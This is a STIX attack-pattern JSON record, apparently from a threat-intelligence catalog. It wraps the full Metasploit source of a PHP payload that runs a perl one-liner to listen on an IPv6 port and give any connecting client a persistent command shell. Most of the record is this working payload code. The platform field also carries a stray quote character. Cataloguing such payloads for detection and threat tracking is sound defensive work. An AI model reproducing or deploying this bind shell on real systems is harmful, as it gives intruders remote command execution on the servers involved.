{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a28b0ce4-b092-440a-960d-e41ef19df0c4",
    "created": "2024-08-14T16:33:19.289175Z",
    "modified": "2024-08-14T16:33:19.289179Z",
    "name": "PHP Command Shell, Bind TCP (via perl) IPv6",
    "description": "Listen for a connection and spawn a command shell via perl (persistent) over IPv6",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/php/bind_perl_ipv6.rb",
            "external_id": "bind_perl_ipv6.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 230\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'PHP Command Shell, Bind TCP (via perl) IPv6',\n      'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent) over IPv6',\n      'Author'        => ['Samy <samy[at]samy.pl>', 'cazz'],\n      'License'       => BSD_LICENSE,\n      'Platform'      => 'php',\n      'Arch'          => ARCH_PHP,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShell,\n      'PayloadType'   => 'cmd',\n      'Payload'       =>\n        {\n          'Offsets' => { },\n          'Payload' => ''\n        }\n      ))\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    return super + \"system(base64_decode('#{Rex::Text.encode_base64(command_string)}'));\"\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n\n    cmd = \"perl -MIO -e '$p=fork();exit,if$p;\" +\n      \"$c=new IO::Socket::INET6(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;\" +\n      \"$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'\"\n\n    return cmd\n  end\nend\n",
    "x_mitre_platforms": [
        "php'"
    ]
}